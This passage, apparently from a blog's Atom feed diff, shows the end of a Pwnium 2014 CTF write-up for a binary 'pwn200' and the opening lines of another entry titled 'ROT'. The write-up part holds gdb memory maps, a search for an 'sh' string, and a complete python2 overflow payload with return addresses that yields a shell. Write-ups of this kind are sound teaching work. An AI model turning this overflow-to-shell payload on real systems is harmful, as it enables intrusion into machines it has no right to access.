+  &lt;span class="mh"&gt;0xf7723000&lt;/span&gt; &lt;span class="mh"&gt;0xf7725000&lt;/span&gt;     &lt;span class="mh"&gt;0x2000&lt;/span&gt;   &lt;span class="mh"&gt;0x1bd000&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lib32&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;2.19&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;so&lt;/span&gt;
+  &lt;span class="mh"&gt;0xf7725000&lt;/span&gt; &lt;span class="mh"&gt;0xf7727000&lt;/span&gt;     &lt;span class="mh"&gt;0x2000&lt;/span&gt;        &lt;span class="mh"&gt;0x0&lt;/span&gt; 
+  &lt;span class="mh"&gt;0xf7757000&lt;/span&gt; &lt;span class="mh"&gt;0xf7759000&lt;/span&gt;     &lt;span class="mh"&gt;0x2000&lt;/span&gt;        &lt;span class="mh"&gt;0x0&lt;/span&gt; 
+  &lt;span class="mh"&gt;0xf7759000&lt;/span&gt; &lt;span class="mh"&gt;0xf775a000&lt;/span&gt;     &lt;span class="mh"&gt;0x1000&lt;/span&gt;        &lt;span class="mh"&gt;0x0&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;vdso&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+  &lt;span class="mh"&gt;0xf775a000&lt;/span&gt; &lt;span class="mh"&gt;0xf777b000&lt;/span&gt;    &lt;span class="mh"&gt;0x21000&lt;/span&gt;        &lt;span class="mh"&gt;0x0&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lib32&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ld&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;2.19&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;so&lt;/span&gt;
+  &lt;span class="mh"&gt;0xf777b000&lt;/span&gt; &lt;span class="mh"&gt;0xf777c000&lt;/span&gt;     &lt;span class="mh"&gt;0x1000&lt;/span&gt;        &lt;span class="mh"&gt;0x0&lt;/span&gt; 
+  &lt;span class="mh"&gt;0xf777c000&lt;/span&gt; &lt;span class="mh"&gt;0xf777d000&lt;/span&gt;     &lt;span class="mh"&gt;0x1000&lt;/span&gt;    &lt;span class="mh"&gt;0x21000&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lib32&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ld&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;2.19&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;so&lt;/span&gt;
+  &lt;span class="mh"&gt;0xf777d000&lt;/span&gt; &lt;span class="mh"&gt;0xf777e000&lt;/span&gt;     &lt;span class="mh"&gt;0x1000&lt;/span&gt;    &lt;span class="mh"&gt;0x22000&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lib32&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ld&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;2.19&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;so&lt;/span&gt;
+  &lt;span class="mh"&gt;0xffeba000&lt;/span&gt; &lt;span class="mh"&gt;0xffedb000&lt;/span&gt;    &lt;span class="mh"&gt;0x21000&lt;/span&gt;        &lt;span class="mh"&gt;0x0&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;stack&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;find&lt;/span&gt; &lt;span class="mh"&gt;0x08048000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;5000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;sh&amp;quot;&lt;/span&gt;
+&lt;span class="mh"&gt;0x8048c01&lt;/span&gt;
+&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;pattern&lt;/span&gt; &lt;span class="n"&gt;found&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Instead of 0x80487f3 we are now using 0x8048c01.&lt;/p&gt;
+&lt;h2&gt;Putting it all together&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# first pipe the shellcode, then use stdin&lt;/span&gt;
+&lt;span class="o"&gt;(&lt;/span&gt;python2 -c &lt;span class="s1"&gt;&amp;#39;print(&amp;quot;A&amp;quot;*36+&amp;quot;\xa2\x86\x04\x08&amp;quot;+&amp;quot;\x01\x8c\x04\x08&amp;quot;+&amp;quot;BBBB&amp;quot;+ &amp;quot;\xa6\x87\x04\x08&amp;quot;+&amp;quot;CCCC&amp;quot;+&amp;quot;DDDD&amp;quot;+ &amp;quot;EEE\n&amp;quot; +&amp;quot;-1&amp;quot;)&amp;#39;&lt;/span&gt;; cat&lt;span class="o"&gt;)&lt;/span&gt; | ./pwn200
+ls /
+bin   dev  krebs  media  root  sbin  sys  usr  var
+boot  etc  home   lib    mnt   proc  run  tmp
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;Cheers&lt;/h2&gt;
+&lt;p&gt;To &lt;a href="https://ctftime.org/team/6997"&gt;Team Action Kaktus&lt;/a&gt; on ctftime for making a writeup with a nonfunct solution, this made me try hard enough to finish it by myself.&lt;/p&gt;</summary><category term="crackme"></category><category term="pwnium2014"></category><category term="post-mortem"></category></entry><entry><title>ROT</title><link href="http://krebsco.de/rot.html" rel="alternate"></link><updated>2014-07-21T00:00:00+02:00</updated><author><name>makefu</name></author><id>tag:krebsco.de,2014-07-21:rot.html</id><summary type="html">&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;Solved by&lt;/strong&gt;: momorientes, exco, ttb, makefu&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;Author First Part&lt;/strong&gt;: momorientes&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;Author Second Part&lt;/strong&gt;: makefu&lt;/li&gt;
